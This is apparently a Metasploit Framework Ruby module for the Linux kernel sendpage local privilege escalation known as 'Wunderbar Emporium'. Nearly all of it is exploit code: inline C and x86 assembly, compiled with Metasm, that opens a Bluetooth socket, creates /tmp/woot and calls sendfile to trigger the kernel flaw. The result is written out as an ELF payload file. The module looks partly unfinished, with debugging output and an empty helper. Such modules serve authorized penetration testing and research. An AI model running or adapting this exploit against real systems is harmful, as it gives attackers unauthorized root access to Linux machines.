##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'
require 'msf/core/exploit/local/linux_kernel'
require 'msf/core/exploit/local/unix'


load 'lib/msf/core/exploit/local/unix.rb'

class Metasploit4 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::File
	include Msf::Post::Common

	include Msf::Exploit::Local::LinuxKernel
	include Msf::Exploit::Local::Unix

	def initialize(info={})
		super( update_info( info, {
				'Name'          => 'Linux Kernel Sendpage Local Privilege Escalation',
				'Description'   => %q{
					AKA Wunderbar Emporium
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'spender', # wunderbar_emporium.tgz
						'egypt'    # metasploit module
					],
				'Platform'      => [ 'linux' ],
				'Arch'          => [ ARCH_X86 ],
				'SessionTypes'  => [ 'shell', 'meterpreter' ],
				'Targets'       =>
					[
						[ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
						#[ 'Linux x64',       { 'Arch' => ARCH_X86_64 } ],
					],
				#'DefaultOptions' => { "PrependSetresuid" => true, "WfsDelay" => 2 },
				'DefaultTarget' => 0,
			}
			))
	end

	def exploit
		include_socket_h
		sc = Metasm::Shellcode.new(@cpu)

		case target.arch.first
		when ARCH_X86
			@cparser.parse <<-EOS
			#define NULL ((void*)0)
			#define PAGE_SIZE (4096)
			#define O_CREAT 64
			#define O_RDWR 2

			#define MAP_PRIVATE  0x02
			#define MAP_FIXED    0x10
			#define MAP_ANONYOUS 0x20

			void exit(int);
			int open(char *, int, int);
			void sigtrap();
			int ftruncate(int, int);
			int sendfile(int, int, int *, int);
			int socket(int, int, int);

			int current_stack_pointer(void);

			void main() {
				int in_fd, out_fd;
				char *addr;

				out_fd = socket(PF_BLUETOOTH, SOCK_DGRAM, 0);
				in_fd = open("/tmp/woot", O_CREAT | O_RDWR, 0700);
				ftruncate(in_fd, 0);
				sendfile(in_fd, out_fd, NULL, PAGE_SIZE);
				exit(0x42);
			}
			EOS
			asm = @cpu.new_ccompiler(@cparser, sc).compile
			puts asm

			sc.parse "call main"
			sc.parse asm
			sc.parse <<-EOS
			current_stack_pointer:
				mov eax, esp
			ret
			EOS

			sc.parse <<-EOS
				sigtrap:
					int 3
					ret
				exit:
					mov eax, 1         ; sys_exit
					mov ebx, [esp+4]
					int 0x80
					ret
				open:
					mov eax, 5         ; sys_open
					mov ecx,[esp+8]    ; mode
					mov ebx,[esp+4]    ; flags
					int 0x80
					ret
				ftruncate:
					mov eax, 92        ; sys_ftruncate
					mov ecx,[esp+8]    ; file descriptor
					mov ebx,[esp+4]    ; size
					int 0x80
					ret
				socket:
					mov eax, 102       ; sys_socketcall
					mov ecx,[esp]      ; args
					mov ebx,0x1        ;
					int 0x80
					ret
				sendfile:
					mov eax, 187       ; sys_sendfile
					mov esi,[esp+16]   ; size
					mov edx,[esp+12]   ; offset
					mov ecx,[esp+8]    ; out_fd
					mov ebx,[esp+4]    ; in_fd
					int 0x80
					ret
			EOS
		end

		sc.assemble

		foo = sc.encode_string

		#puts Rex::Text.to_hex_dump(foo)
		File.open("payload.bin", "wb") {|fd|
			fd.write Msf::Util::EXE.to_linux_x86_elf(framework, foo)
		}

	end

	def include_linux_syscall_h
	end


end
